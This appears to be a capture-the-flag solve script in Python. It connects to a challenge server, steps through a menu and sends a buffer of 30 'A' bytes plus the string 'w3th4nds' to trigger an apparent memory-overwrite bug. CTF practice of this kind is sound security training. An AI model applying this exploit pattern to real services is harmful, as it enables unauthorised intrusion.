#!/usr/bin/env python3
import socket
import time

host = 'ctf.1337.ma'
port = 1338

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def send_and_show(data, desc):
    print(f"\n{'='*60}")
    print(f"SENDING: {desc}")
    print(f"Data: {repr(data)}")
    print(f"{'='*60}")
    s.sendall(data)
    time.sleep(0.5)
    resp = s.recv(8192)
    print(f"RESPONSE ({len(resp)} bytes):")
    print(resp.decode(errors='ignore'))
    return resp

# Banner
print("Getting banner...")
time.sleep(0.5)
banner = s.recv(8192)
print(banner.decode(errors='ignore'))

send_and_show(b'2\n', "Option 2 - Obliterate")
send_and_show(b'1\n', "Option 1 - Reserve space")
send_and_show(b'38\n', "Size: 38")
send_and_show(b'A' * 30 + b'w3th4nds\n', "Payload")
final = send_and_show(b'3\n', "Option 3 - Road to salvation")

print("\n" + "="*60)
print("FINAL CHECK - waiting 3 more seconds...")
print("="*60)
time.sleep(3)
try:
    extra = s.recv(8192)
    if extra:
        print(f"Got {len(extra)} more bytes:")
        print(extra.decode(errors='ignore'))
except:
    pass

s.close()
print("\nDone!")
